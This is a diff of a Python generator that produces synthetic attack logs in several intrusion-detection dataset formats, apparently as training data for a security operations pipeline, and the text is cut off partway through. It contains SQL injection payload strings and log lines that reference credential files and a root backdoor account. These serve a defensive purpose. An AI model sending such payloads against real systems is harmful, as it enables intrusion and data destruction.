@@ -1,477 +1,733 @@
 """
-Live Attack Log Generator — simulates attack logs matching real dataset formats.
+log_generator.py
+================
+Synthetic security-log generator for the AI SOC Assistant project.
 
-Supported dataset formats:
-  cic      — CIC-IDS2018 & CIC-APT-IDS2023 (network flow features)
-  unsw     — UNSW-NB15 (network flow + protocol features)
-  beth     — BETH dataset (Linux host/process logs)
-  syslog   — Generic syslog (original format)
+Each public function accepts (attacker_ip, target_ip) and returns a
+list of dicts with at minimum:
+    source   : str   – originating dataset / sub-system
+    severity : str   – CRITICAL | HIGH | MEDIUM | LOW | INFO
+    message  : str   – human-readable alert line
+    raw      : str   – JSON string (structured) or syslog-style line
 
-Usage:
-    python log_generator.py                              # syslog, random attacks, 1/sec
-    python log_generator.py --dataset cic               # CIC-IDS2018 format
-    python log_generator.py --dataset unsw              # UNSW-NB15 format
-    python log_generator.py --dataset beth              # BETH format
-    python log_generator.py --dataset all               # cycle all formats
-    python log_generator.py --dataset cic --scenario brute_force
-    python log_generator.py --rate 3 --dataset unsw
+The raw JSON fields are kept dataset-authentic so downstream Spark
+feature engineering and the ML pipeline receive familiar column names.
+
+Kafka integration is wired through send_log(); that function is a no-op
+when KafkaProducer is None (mock mode used by the test harness).
 """
 
-import argparse
+from __future__ import annotations
+
 import json
 import random
-import sys
 import time
-from datetime import datetime, timezone
+from datetime import datetime, timezone, timedelta
+from typing import Any
 
-# Windows UTF-8 fix
-if sys.platform == "win32":
-    sys.stdout.reconfigure(encoding="utf-8")
+# ---------------------------------------------------------------------------
+# Optional Kafka – graceful fallback when not installed
+# ---------------------------------------------------------------------------
+try:
+    from kafka import KafkaProducer
+    from kafka.errors import NoBrokersAvailable
+except Exception:
+    KafkaProducer = None  # type: ignore
+    NoBrokersAvailable = Exception
 
-from kafka import KafkaProducer
-from kafka.errors import NoBrokersAvailable
-
-KAFKA_BROKER = "localhost:9092"
-KAFKA_TOPIC  = "raw-logs"
-
-
-def ts() -> str:
-    return datetime.now(timezone.utc).isoformat()
-
-def rand_ip() -> str:
-    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-
-def rand_internal_ip() -> str:
-    return f"10.0.0.{random.randint(1, 50)}"
-
-def rand_port() -> int:
-    return random.randint(1024, 65535)
-
-def rand_mac() -> str:
-    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
-
-
-# ── CIC-IDS2018 / CIC-APT-IDS2023 format ─────────────────────────────────────
-# Mimics network flow feature vector used by CIC datasets
-
-CIC_LABELS = {
-    "brute_force":          "Brute Force -Web",
-    "sql_injection":        "SQL Injection",
-    "port_scan":            "Infilteration",
-    "privilege_escalation": "Infilteration",
-    "data_exfiltration":    "Infilteration",
-    "ransomware":           "Bot",
-    "c2_beacon":            "Bot",
-    "ddos":                 "DDoS attacks-LOIC-HTTP",
-    "normal":               "Benign",
-}
-
-def cic_flow(src_ip: str, dst_ip: str, label: str, attack: bool = True) -> dict:
-    proto = random.choice([6, 17])  # TCP=6, UDP=17
-    fwd_pkts = random.randint(1, 500)
-    bwd_pkts = random.randint(1, 200)
-    fwd_bytes = fwd_pkts * random.randint(40, 1500)
-    bwd_bytes = bwd_pkts * random.randint(40, 1500)
-    duration = random.randint(0, 120000000)  # microseconds
-
-    return {
-        "source": "cic-flowmeter",
-        "severity": "critical" if attack else "info",
-        "message": f"Network flow: {src_ip} → {dst_ip} | Label: {label}",
-        "timestamp": ts(),
-        "raw": json.dumps({
-            "Dst Port":            random.choice([22, 80, 443, 3306, 8080]) if attack else rand_port(),
-            "Protocol":            proto,
-            "Flow Duration":       duration,
-            "Tot Fwd Pkts":        fwd_pkts,
-            "Tot Bwd Pkts":        bwd_pkts,
-            "TotLen Fwd Pkts":     fwd_bytes,
-            "TotLen Bwd Pkts":     bwd_bytes,
-            "Fwd Pkt Len Max":     random.randint(40, 1500),
-            "Fwd Pkt Len Min":     random.randint(20, 40),
-            "Fwd Pkt Len Mean":    round(fwd_bytes / max(fwd_pkts, 1), 2),
-            "Bwd Pkt Len Max":     random.randint(40, 1500),
-            "Bwd Pkt Len Mean":    round(bwd_bytes / max(bwd_pkts, 1), 2),
-            "Flow Byts/s":         round(random.uniform(0, 1000000), 2),
-            "Flow Pkts/s":         round(random.uniform(0, 10000), 2),
-            "Flow IAT Mean":       round(random.uniform(0, 100000), 2),
-            "Flow IAT Std":        round(random.uniform(0, 50000), 2),
-            "Fwd IAT Mean":        round(random.uniform(0, 100000), 2),
-            "Bwd IAT Mean":        round(random.uniform(0, 100000), 2),
-            "Fwd PSH Flags":       random.randint(0, 1),
-            "SYN Flag Cnt":        random.randint(0, 10) if attack else random.randint(0, 2),
-            "RST Flag Cnt":        random.randint(0, 5),
-            "ACK Flag Cnt":        random.randint(0, fwd_pkts),
-            "URG Flag Cnt":        random.randint(0, 2) if attack else 0,
-            "Init Fwd Win Byts":   random.randint(0, 65535),
-            "Init Bwd Win Byts":   random.randint(0, 65535),
-            "Src IP":              src_ip,
-            "Dst IP":              dst_ip,
-            "Label":               label,
-        })
-    }
-
-
-def cic_brute_force(attacker: str, target: str) -> list[dict]:
-    logs = [cic_flow(attacker, target, CIC_LABELS["brute_force"]) for _ in range(random.randint(6, 15))]
-    logs.append(cic_flow(attacker, target, "Brute Force -SSH"))
-    return logs
-
-def cic_sql_injection(attacker: str, target: str) -> list[dict]:
-    return [cic_flow(attacker, target, CIC_LABELS["sql_injection"]) for _ in range(random.randint(3, 8))]
-
-def cic_infiltration(attacker: str, target: str) -> list[dict]:
-    return [cic_flow(attacker, target, CIC_LABELS["port_scan"]) for _ in range(random.randint(4, 10))]
-
-def cic_bot(attacker: str, target: str) -> list[dict]:
-    return [cic_flow(attacker, target, CIC_LABELS["c2_beacon"]) for _ in range(random.randint(3, 7))]
-
-def cic_ddos(attacker: str, target: str) -> list[dict]:
-    return [cic_flow(attacker, target, CIC_LABELS["ddos"]) for _ in range(random.randint(5, 12))]
-
-
-# ── UNSW-NB15 format ──────────────────────────────────────────────────────────
-# Mimics UNSW-NB15 feature set
-
-UNSW_CATEGORIES = {
-    "brute_force":          "Backdoors",
-    "sql_injection":        "Exploits",
-    "port_scan":            "Reconnaissance",
-    "privilege_escalation": "Shellcode",
-    "data_exfiltration":    "Worms",
-    "ransomware":           "Generic",
-    "c2_beacon":            "Backdoors",
-}
-
-UNSW_PROTOS  = ["tcp", "udp", "icmp", "ospf", "arp"]
-UNSW_STATES  = ["FIN", "INT", "CON", "REQ", "RST", "URN", "no"]
-UNSW_SERVICES = ["-", "http", "ftp", "smtp", "dns", "ssh", "ftp-data", "irc"]
-
-def unsw_record(src_ip: str, dst_ip: str, category: str) -> dict:
-    proto = random.choice(UNSW_PROTOS)
-    sbytes = random.randint(100, 100000)
-    dbytes = random.randint(100, 50000)
-    dur = round(random.uniform(0, 60), 6)
-
-    return {
-        "source": "unsw-sensor",
-        "severity": "error" if category != "-" else "info",
-        "message": f"UNSW flow: {src_ip}:{rand_port()} → {dst_ip}:{rand_port()} | {proto.upper()} | Category: {category}",
-        "timestamp": ts(),
-        "raw": json.dumps({
-            "srcip":     src_ip,
-            "sport":     rand_port(),
-            "dstip":     dst_ip,
-            "dsport":    random.choice([22, 80, 443, 21, 25, 53]),
-            "proto":     proto,
-            "state":     random.choice(UNSW_STATES),
-            "dur":       dur,
-            "sbytes":    sbytes,
-            "dbytes":    dbytes,
-            "sttl":      random.randint(1, 255),
-            "dttl":      random.randint(1, 255),
-            "sloss":     random.randint(0, 10),
-            "dloss":     random.randint(0, 10),
-            "service":   random.choice(UNSW_SERVICES),
-            "Sload":     round(random.uniform(0, 1000000), 2),
-            "Dload":     round(random.uniform(0, 1000000), 2),
-            "Spkts":     random.randint(1, 500),
-            "Dpkts":     random.randint(1, 200),
-            "Swin":      random.randint(0, 65535),
-            "Dwin":      random.randint(0, 65535),
-            "ct_srv_src": random.randint(1, 50),
-            "ct_dst_ltm": random.randint(1, 50),
-            "ct_src_ltm": random.randint(1, 50),
-            "ct_srv_dst": random.randint(1, 50),
-            "is_sm_ips_ports": random.randint(0, 1),
-            "attack_cat": category,
-            "label":     0 if category == "-" else 1,
-        })
-    }
-
-def unsw_brute_force(attacker: str, target: str) -> list[dict]:
-    return [unsw_record(attacker, target, UNSW_CATEGORIES["brute_force"]) for _ in range(random.randint(5, 12))]
-
-def unsw_recon(attacker: str, target: str) -> list[dict]:
-    return [unsw_record(attacker, target, UNSW_CATEGORIES["port_scan"]) for _ in range(random.randint(4, 10))]
-
-def unsw_exploits(attacker: str, target: str) -> list[dict]:
-    return [unsw_record(attacker, target, UNSW_CATEGORIES["sql_injection"]) for _ in range(random.randint(3, 8))]
-
-def unsw_shellcode(attacker: str, target: str) -> list[dict]:
-    return [unsw_record(attacker, target, UNSW_CATEGORIES["privilege_escalation"]) for _ in range(random.randint(2, 6))]
-
-def unsw_worm(attacker: str, target: str) -> list[dict]:
-    targets = [rand_internal_ip() for _ in range(random.randint(3, 8))]
-    return [unsw_record(attacker, t, UNSW_CATEGORIES["data_exfiltration"]) for t in targets]
-
-
-# ── BETH dataset format ───────────────────────────────────────────────────────
-# Mimics BETH (enterprise Linux host logs) — process/syscall based
-
-BETH_PROCESSES = ["bash", "python3", "curl", "wget", "nc", "nmap", "ssh", "sudo", "chmod", "useradd"]
-BETH_SYSCALLS  = ["execve", "open", "read", "write", "connect", "fork", "clone", "ptrace", "kill", "mmap"]
-
-def beth_event(host_ip: str, user: str, evil: bool) -> dict:
-    proc = random.choice(BETH_PROCESSES)
-    syscall = random.choice(BETH_SYSCALLS)
-    uid = 0 if evil else random.randint(1000, 2000)
-    ppid = random.randint(1, 1000)
-    pid = random.randint(1001, 9999)
-
-    return {
-        "source": "beth-host",
-        "severity": "critical" if evil and uid == 0 else ("warning" if evil else "info"),
-        "message": f"Host event on {host_ip}: {'[EVIL]' if evil else '[BENIGN]'} {proc} by uid={uid}",
-        "timestamp": ts(),
-        "raw": json.dumps({
-            "processId":       pid,
-            "parentProcessId": ppid,
-            "userId":          uid,
-            "mountNamespace":  random.randint(4026531840, 4026531850),
-            "processName":     proc,
-            "hostName":        host_ip,
-            "eventId":         random.randint(1, 400),
-            "eventName":       syscall,
-            "stackAddresses":  [hex(random.randint(0x7f0000000000, 0x7fffffffffff)) for _ in range(3)],
-            "argsNum":         random.randint(0, 5),
-            "returnValue":     0 if not evil else random.choice([0, -1, -13]),
-            "args": [
-                {"name": "filename", "type": "const char*", "value": random.choice([
-                    "/etc/shadow", "/etc/passwd", "/tmp/exploit", "/bin/bash",
-                    "/root/.ssh/authorized_keys", "/var/log/auth.log"
-                ]) if evil else f"/home/{user}/file.txt"}
-            ],
-            "sus":   1 if evil else 0,
-            "evil":  1 if evil else 0,
-        })
-    }
-
-def beth_privilege_escalation(attacker: str, target: str) -> list[dict]:
-    user = random.choice(["www-data", "apache", "postgres", "nobody"])
-    logs = [beth_event(target, user, evil=False) for _ in range(3)]
-    logs += [beth_event(target, user, evil=True) for _ in range(random.randint(3, 7))]
-    return logs
-
-def beth_lateral_movement(attacker: str, target: str) -> list[dict]:
-    logs = []
-    for ip in [rand_internal_ip() for _ in range(random.randint(2, 5))]:
-        logs += [beth_event(ip, "root", evil=True) for _ in range(random.randint(2, 4))]
-    return logs
-
-def beth_c2(attacker: str, target: str) -> list[dict]:
-    logs = [beth_event(target, "root", evil=True) for _ in range(random.randint(4, 8))]
-    return logs
-
-
-# ── Syslog format (original) ──────────────────────────────────────────────────
-
-def syslog_brute_force(attacker: str, target: str) -> list[dict]:
-    user = random.choice(["root", "admin", "ubuntu", "svc_account"])
-    logs = []
-    for i in range(random.randint(8, 20)):
-        logs.append({
-            "source": "auth-server", "severity": "warning",
-            "message": f"Failed SSH login for user '{user}' from {attacker} (attempt {i+1})",
-            "timestamp": ts(),
-            "raw": f"sshd[{random.randint(1000,9999)}]: Failed password for {user} from {attacker} port {rand_port()} ssh2",
-        })
-    logs.append({
-        "source": "auth-server", "severity": "critical",
-        "message": f"Brute force SUCCESS — '{user}' logged in from {attacker}",
-        "timestamp": ts(),
-        "raw": f"sshd[{random.randint(1000,9999)}]: Accepted password for {user} from {attacker} port {rand_port()} ssh2",
-    })
-    return logs
-
-def syslog_sql_injection(attacker: str, target: str) -> list[dict]:
-    payloads = ["' OR '1'='1", "'; DROP TABLE users--", "' UNION SELECT username,password FROM users--"]
-    logs = []
-    for p in payloads:
-        logs.append({
-            "source": "ids-sensor", "severity": "error",
-            "message": f"SQL injection attempt from {attacker} on {target}",
-            "timestamp": ts(),
-            "raw": f"ALERT sql_injection SRC={attacker} DST={target} URI=/api/login payload=\"{p}\"",
-        })
-    logs.append({
-        "source": "ids-sensor", "severity": "critical",
-        "message": f"SQL injection SUCCESSFUL — DB dump from {attacker}",
-        "timestamp": ts(),
-        "raw": f"ALERT sql_injection_success SRC={attacker} DST={target} rows_returned=1500",
-    })
-    return logs
-
-def syslog_port_scan(attacker: str, target: str) -> list[dict]:
-    open_ports = random.sample([22, 80, 443, 3306, 5432, 8080], 3)
-    return [
-        {"source": "firewall-01", "severity": "warning",
-         "message": f"Port scan from {attacker} → {target}", "timestamp": ts(),
-         "raw": f"PORTSCAN SRC={attacker} DST={target} PORTS_PROBED=1024"},
-        {"source": "ids-sensor", "severity": "error",
-         "message": f"Exploitation attempt on {target}:{open_ports[0]} from {attacker}", "timestamp": ts(),
-         "raw": f"EXPLOIT SRC={attacker} DST={target} PORT={open_ports[0]} CVE=CVE-2024-{random.randint(1000,9999)}"},
-        {"source": "ids-sensor", "severity": "critical",
-         "message": f"RCE on {target} — shell spawned by {attacker}", "timestamp": ts(),
-         "raw": f"RCE SRC={attacker} DST={target} shell=/bin/bash pid={random.randint(1000,9999)}"},
-    ]
-
-def syslog_ransomware(attacker: str, target: str) -> list[dict]:
-    return [
-        {"source": "syslog", "severity": "warning",
-         "message": f"Mass file encryption on {target}", "timestamp": ts(),
-         "raw": f"inotify: mass rename /home/data/*.docx -> *.encrypted count=342"},
-        {"source": "ids-sensor", "severity": "critical",
-         "message": f"Ransomware detected on {target}", "timestamp": ts(),
-         "raw": f"RANSOMWARE host={target} files_encrypted=1024 extension=.locked"},
-        {"source": "firewall-01", "severity": "critical",
-         "message": f"Ransomware C2 to {attacker} from {target}", "timestamp": ts(),
-         "raw": f"C2_BEACON SRC={target} DST={attacker} DPT=8443 interval=30s"},
-    ]
-
-def syslog_c2(attacker: str, target: str) -> list[dict]:
-    interval = random.choice([30, 60, 120])
-    return [
-        {"source": "firewall-01", "severity": "warning",
-         "message": f"Periodic beacon from {target} → {attacker} every {interval}s", "timestamp": ts(),
-         "raw": f"BEACON SRC={target} DST={attacker} DPT=443 interval={interval}s"},
-        {"source": "ids-sensor", "severity": "critical",
-         "message": f"Cobalt Strike C2 detected: {target} → {attacker}", "timestamp": ts(),
-         "raw": f"C2_DETECTED SRC={target} DST={attacker} signature=cobaltstrike jitter=10%"},
-    ]
-
-def syslog_privilege_escalation(attacker: str, target: str) -> list[dict]:
-    user = random.choice(["www-data", "apache", "nginx", "postgres"])
-    return [
-        {"source": "syslog", "severity": "warning",
-         "message": f"Unusual sudo by '{user}' on {target}", "timestamp": ts(),
-         "raw": f"sudo: {user} TTY=pts/0 PWD=/tmp USER=root COMMAND=/bin/bash"},
-        {"source": "syslog", "severity": "critical",
-         "message": f"Privilege escalation SUCCESS — '{user}' → root on {target}", "timestamp": ts(),
-         "raw": f"sudo: pam_unix: session opened for user root by {user}(uid=0)"},
-        {"source": "syslog", "severity": "critical",
-         "message": f"Backdoor account created on {target}", "timestamp": ts(),
-         "raw": f"useradd: new user name=backdoor UID=0 GID=0 shell=/bin/bash"},
-    ]
-
-def syslog_data_exfiltration(attacker: str, target: str) -> list[dict]:
-    size_mb = random.randint(50, 500)
-    return [
-        {"source": "ids-sensor", "severity": "error",
-         "message": f"Large outbound transfer {target} → {attacker} ({size_mb}MB)", "timestamp": ts(),
-         "raw": f"OUTBOUND SRC={target} DST={attacker} DPT=443 BYTES={size_mb*1024*1024}"},
-        {"source": "ids-sensor", "severity": "critical",
-         "message": f"Sensitive file access before exfiltration on {target}", "timestamp": ts(),
-         "raw": f"FILE_ACCESS path=/etc/shadow user=root src_ip={attacker} action=read"},
-    ]
-
-
-# ── Scenario registry per dataset ─────────────────────────────────────────────
-
-DATASETS = {
-    "cic": {
-        "brute_force":          cic_brute_force,
-        "sql_injection":        cic_sql_injection,
-        "infiltration":         cic_infiltration,
-        "bot":                  cic_bot,
-        "ddos":                 cic_ddos,
-    },
-    "unsw": {
-        "brute_force":          unsw_brute_force,
-        "reconnaissance":       unsw_recon,
-        "exploits":             unsw_exploits,
-        "shellcode":            unsw_shellcode,
-        "worm":                 unsw_worm,
-    },
-    "beth": {
-        "privilege_escalation": beth_privilege_escalation,
-        "lateral_movement":     beth_lateral_movement,
-        "c2_beacon":            beth_c2,
-    },
-    "syslog": {
-        "brute_force":          syslog_brute_force,
-        "sql_injection":        syslog_sql_injection,
-        "port_scan":            syslog_port_scan,
-        "privilege_escalation": syslog_privilege_escalation,
-        "data_exfiltration":    syslog_data_exfiltration,
-        "ransomware":           syslog_ransomware,
-        "c2_beacon":            syslog_c2,
-    },
+_PRODUCER: Any = None
+KAFKA_TOPIC_MAP: dict[str, str] = {
+    "CIC": "cic-logs",
+    "UNSW": "unsw-logs",
+    "BETH": "beth-logs",
+    "SYSLOG": "syslog-logs",
 }
 
 
-# ── Main ──────────────────────────────────────────────────────────────────────
+def _get_producer(bootstrap: str = "localhost:9092"):
+    global _PRODUCER
+    if KafkaProducer is None:
+        return None
+    if _PRODUCER is None:
+        try:
+            _PRODUCER = KafkaProducer(
+                bootstrap_servers=[bootstrap],
+                value_serializer=lambda v: json.dumps(v).encode("utf-8"),
+            )
+        except NoBrokersAvailable:
+            _PRODUCER = None
+    return _PRODUCER
 
-def main():
-    parser = argparse.ArgumentParser(description="Attack log generator → Kafka")
-    parser.add_argument("--rate",     type=float, default=1.0,   help="Logs per second (default: 1)")
-    parser.add_argument("--dataset",  default="syslog",          help="Dataset format: cic | unsw | beth | syslog | all")
-    parser.add_argument("--scenario", default="random",          help="Scenario name or 'random'")
-    parser.add_argument("--broker",   default=KAFKA_BROKER,      help="Kafka broker")
-    parser.add_argument("--topic",    default=KAFKA_TOPIC,       help="Kafka topic")
-    args = parser.parse_args()
 
-    if args.dataset != "all" and args.dataset not in DATASETS:
-        print(f"❌ Unknown dataset '{args.dataset}'. Choose from: {list(DATASETS.keys()) + ['all']}")
-        return
+def send_log(log: dict, topic: str = "soc-logs") -> None:
+    """Push a single log dict to Kafka; silent no-op if unavailable."""
+    producer = _get_producer()
+    if producer:
+        try:
+            producer.send(topic, log)
+        except Exception:
+            pass
 
-    try:
-        producer = KafkaProducer(
-            bootstrap_servers=args.broker,
-            value_serializer=lambda v: json.dumps(v).encode("utf-8"),
+
+# ---------------------------------------------------------------------------
+# Shared helpers
+# ---------------------------------------------------------------------------
+
+def _ts(offset_seconds: float = 0.0) -> str:
+    """ISO-8601 UTC timestamp, optionally shifted by offset_seconds."""
+    t = datetime.now(timezone.utc) + timedelta(seconds=offset_seconds)
+    return t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
+
+
+def _rand_port(exclude_well_known: bool = False) -> int:
+    low = 1024 if exclude_well_known else 1
+    return random.randint(low, 65535)
+
+
+def _rand_proto() -> str:
+    return random.choice(["TCP", "UDP", "ICMP"])
+
+
+def _rand_bytes() -> int:
+    return random.randint(40, 65535)
+
+
+def _make_log(source: str, severity: str, message: str, raw: Any) -> dict:
+    raw_str = json.dumps(raw) if isinstance(raw, dict) else str(raw)
+    return {
+        "timestamp": _ts(),
+        "source": source,
+        "severity": severity,
+        "message": message,
+        "raw": raw_str,
+    }
+
+
+# ===========================================================================
+# CIC-IDS2018 / CIC-APT-IDS2023
+# ===========================================================================
+
+def cic_brute_force(attacker: str, target: str, n: int = 8) -> list[dict]:
+    """SSH / FTP brute-force — high-frequency short-duration flows."""
+    logs = []
+    for i in range(n):
+        raw = {
+            "Timestamp": _ts(i * 0.5),
+            "Dst IP": target,
+            "Src IP": attacker,
+            "Dst Port": random.choice([22, 21, 3389]),
+            "Protocol": "TCP",
+            "Flow Duration": random.randint(100_000, 500_000),
+            "Tot Fwd Pkts": random.randint(4, 12),
+            "Tot Bwd Pkts": random.randint(1, 4),
+            "TotLen Fwd Pkts": random.randint(200, 800),
+            "TotLen Bwd Pkts": random.randint(50, 300),
+            "Flow Byts/s": round(random.uniform(500, 5000), 2),
+            "Flow Pkts/s": round(random.uniform(10, 100), 2),
+            "SYN Flag Cnt": 1,
+            "RST Flag Cnt": random.randint(0, 1),
+            "Label": "Brute Force",
+        }
+        logs.append(_make_log(
+            source="CIC-IDS2018",
+            severity="HIGH",
+            message=(
+                f"Brute-force attempt from {attacker} → {target}:"
+                f"{raw['Dst Port']} ({raw['Tot Fwd Pkts']} pkts)"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def cic_ddos(attacker: str, target: str, n: int = 10) -> list[dict]:
+    """DDoS (SYN-flood / UDP-flood) — massive packet rates, short flows."""
+    logs = []
+    for i in range(n):
+        proto = random.choice(["TCP", "UDP"])
+        raw = {
+            "Timestamp": _ts(i * 0.1),
+            "Dst IP": target,
+            "Src IP": attacker,
+            "Dst Port": random.choice([80, 443, 53]),
+            "Protocol": proto,
+            "Flow Duration": random.randint(1000, 50_000),
+            "Tot Fwd Pkts": random.randint(500, 5000),
+            "Tot Bwd Pkts": random.randint(0, 10),
+            "TotLen Fwd Pkts": random.randint(30_000, 200_000),
+            "TotLen Bwd Pkts": random.randint(0, 500),
+            "Flow Byts/s": round(random.uniform(50_000, 1_000_000), 2),
+            "Flow Pkts/s": round(random.uniform(1_000, 50_000), 2),
+            "SYN Flag Cnt": random.randint(0, 1) if proto == "TCP" else 0,
+            "Label": "DDoS",
+        }
+        logs.append(_make_log(
+            source="CIC-IDS2018",
+            severity="CRITICAL",
+            message=(
+                f"DDoS flood from {attacker} → {target}:{raw['Dst Port']}"
+                f" [{proto}] {raw['Flow Pkts/s']:.0f} pkts/s"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def cic_bot(attacker: str, target: str, n: int = 6) -> list[dict]:
+    """Bot / C2 beacon — periodic low-volume encrypted flows."""
+    logs = []
+    for i in range(n):
+        raw = {
+            "Timestamp": _ts(i * 30),
+            "Dst IP": target,
+            "Src IP": attacker,
+            "Dst Port": random.choice([443, 8443, 4444, 6667]),
+            "Protocol": "TCP",
+            "Flow Duration": random.randint(200_000, 2_000_000),
+            "Tot Fwd Pkts": random.randint(2, 8),
+            "Tot Bwd Pkts": random.randint(2, 8),
+            "TotLen Fwd Pkts": random.randint(100, 600),
+            "TotLen Bwd Pkts": random.randint(100, 600),
+            "Flow Byts/s": round(random.uniform(50, 500), 2),
+            "Idle Mean": round(random.uniform(1e6, 5e6), 2),
+            "Label": "Bot",
+        }
+        logs.append(_make_log(
+            source="CIC-IDS2018",
+            severity="HIGH",
+            message=(
+                f"Bot C2 beacon from {attacker} → {target}:{raw['Dst Port']}"
+                f" every ~30 s"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def cic_sql_injection(attacker: str, target: str, n: int = 5) -> list[dict]:
+    """SQL injection probe — short HTTP flows with payload signatures."""
+    payloads = [
+        "' OR '1'='1",
+        "'; DROP TABLE users;--",
+        "' UNION SELECT NULL,NULL--",
+        "admin'--",
+        "1' AND SLEEP(5)--",
+    ]
+    logs = []
+    for i in range(n):
+        raw = {
+            "Timestamp": _ts(i * 2),
+            "Dst IP": target,
+            "Src IP": attacker,
+            "Dst Port": 80,
+            "Protocol": "TCP",
+            "Flow Duration": random.randint(50_000, 300_000),
+            "Tot Fwd Pkts": random.randint(3, 10),
+            "Tot Bwd Pkts": random.randint(2, 8),
+            "TotLen Fwd Pkts": random.randint(300, 2000),
+            "TotLen Bwd Pkts": random.randint(500, 5000),
+            "Payload Hint": payloads[i % len(payloads)],
+            "Label": "SQL Injection",
+        }
+        logs.append(_make_log(
+            source="CIC-IDS2018",
+            severity="HIGH",
+            message=(
+                f"SQL-injection attempt from {attacker} → {target}:80"
+                f" payload={payloads[i % len(payloads)]!r}"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def cic_infiltration(attacker: str, target: str, n: int = 5) -> list[dict]:
+    """Infiltration — lateral movement flows after initial compromise."""
+    ports = [445, 135, 139, 3389, 5985]
+    logs = []
+    for i in range(n):
+        raw = {
+            "Timestamp": _ts(i * 10),
+            "Dst IP": target,
+            "Src IP": attacker,
+            "Dst Port": ports[i % len(ports)],
+            "Protocol": "TCP",
+            "Flow Duration": random.randint(500_000, 5_000_000),
+            "Tot Fwd Pkts": random.randint(20, 200),
+            "Tot Bwd Pkts": random.randint(20, 200),
+            "TotLen Fwd Pkts": random.randint(5000, 50_000),
+            "TotLen Bwd Pkts": random.randint(5000, 50_000),
+            "Label": "Infiltration",
+        }
+        logs.append(_make_log(
+            source="CIC-IDS2018",
+            severity="CRITICAL",
+            message=(
+                f"Infiltration lateral-move {attacker} → {target}:{ports[i % len(ports)]}"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+# ===========================================================================
+# UNSW-NB15
+# ===========================================================================
+
+def unsw_recon(attacker: str, target: str, n: int = 8) -> list[dict]:
+    """Network reconnaissance — port scans, OS fingerprinting."""
+    logs = []
+    for i in range(n):
+        raw = {
+            "srcip": attacker,
+            "dstip": target,
+            "sport": _rand_port(exclude_well_known=True),
+            "dsport": random.randint(1, 1024),
+            "proto": _rand_proto(),
+            "dur": round(random.uniform(0.0, 0.5), 6),
+            "sbytes": random.randint(40, 200),
+            "dbytes": random.randint(0, 100),
+            "Spkts": random.randint(1, 5),
+            "Dpkts": random.randint(0, 3),
+            "state": random.choice(["RST", "FIN", "CON"]),
+            "attack_cat": "Reconnaissance",
+            "Label": 1,
+        }
+        logs.append(_make_log(
+            source="UNSW-NB15",
+            severity="MEDIUM",
+            message=(
+                f"Reconnaissance scan from {attacker} → {target}:{raw['dsport']}"
+                f" proto={raw['proto']}"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def unsw_shellcode(attacker: str, target: str, n: int = 4) -> list[dict]:
+    """Shellcode injection flows — anomalous payload entropy."""
+    logs = []
+    for i in range(n):
+        raw = {
+            "srcip": attacker,
+            "dstip": target,
+            "sport": _rand_port(exclude_well_known=True),
+            "dsport": random.choice([21, 22, 80, 445]),
+            "proto": "TCP",
+            "dur": round(random.uniform(0.5, 5.0), 6),
+            "sbytes": random.randint(500, 4000),
+            "dbytes": random.randint(200, 2000),
+            "Spkts": random.randint(5, 30),
+            "Dpkts": random.randint(3, 20),
+            "state": "CON",
+            "ct_srv_dst": random.randint(1, 10),
+            "attack_cat": "Shellcode",
+            "Label": 1,
+        }
+        logs.append(_make_log(
+            source="UNSW-NB15",
+            severity="CRITICAL",
+            message=(
+                f"Shellcode injection detected {attacker} → {target}:{raw['dsport']}"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def unsw_exploits(attacker: str, target: str, n: int = 5) -> list[dict]:
+    """Exploit attempts — CVE-style service exploits."""
+    cves = [
+        "CVE-2017-0144",   # EternalBlue
+        "CVE-2021-44228",  # Log4Shell
+        "CVE-2019-0708",   # BlueKeep
+        "CVE-2018-11776",  # Struts2 RCE
+        "CVE-2022-26134",  # Confluence RCE
+    ]
+    logs = []
+    for i in range(n):
+        raw = {
+            "srcip": attacker,
+            "dstip": target,
+            "sport": _rand_port(exclude_well_known=True),
+            "dsport": random.choice([445, 443, 80, 3389, 8080]),
+            "proto": "TCP",
+            "dur": round(random.uniform(0.1, 3.0), 6),
+            "sbytes": random.randint(1000, 10_000),
+            "dbytes": random.randint(500, 5000),
+            "Spkts": random.randint(10, 80),
+            "Dpkts": random.randint(5, 40),
+            "state": "CON",
+            "cve": cves[i % len(cves)],
+            "attack_cat": "Exploits",
+            "Label": 1,
+        }
+        logs.append(_make_log(
+            source="UNSW-NB15",
+            severity="CRITICAL",
+            message=(
+                f"Exploit attempt {cves[i % len(cves)]} from {attacker} → "
+                f"{target}:{raw['dsport']}"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def unsw_worm(attacker: str, target: str, n: int = 6) -> list[dict]:
+    """Worm propagation — self-replicating scan + infect flows."""
+    logs = []
+    for i in range(n):
+        raw = {
+            "srcip": attacker,
+            "dstip": target,
+            "sport": _rand_port(exclude_well_known=True),
+            "dsport": random.choice([445, 139, 135]),
+            "proto": "TCP",
+            "dur": round(random.uniform(0.05, 1.0), 6),
+            "sbytes": random.randint(300, 3000),
+            "dbytes": random.randint(100, 1500),
+            "Spkts": random.randint(3, 20),
+            "Dpkts": random.randint(1, 10),
+            "state": random.choice(["CON", "RST"]),
+            "ct_dst_sport_ltm": random.randint(1, 100),
+            "attack_cat": "Worms",
+            "Label": 1,
+        }
+        logs.append(_make_log(
+            source="UNSW-NB15",
+            severity="CRITICAL",
+            message=(
+                f"Worm propagation detected {attacker} → {target}:{raw['dsport']}"
+                f" ({raw['ct_dst_sport_ltm']} hosts targeted)"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def unsw_brute_force(attacker: str, target: str, n: int = 7) -> list[dict]:
+    """UNSW-flavoured brute-force (Fuzzers / credential stuffing)."""
+    logs = []
+    for i in range(n):
+        raw = {
+            "srcip": attacker,
+            "dstip": target,
+            "sport": _rand_port(exclude_well_known=True),
+            "dsport": random.choice([22, 23, 21, 3306]),
+            "proto": "TCP",
+            "dur": round(random.uniform(0.01, 0.3), 6),
+            "sbytes": random.randint(100, 600),
+            "dbytes": random.randint(50, 300),
+            "Spkts": random.randint(2, 8),
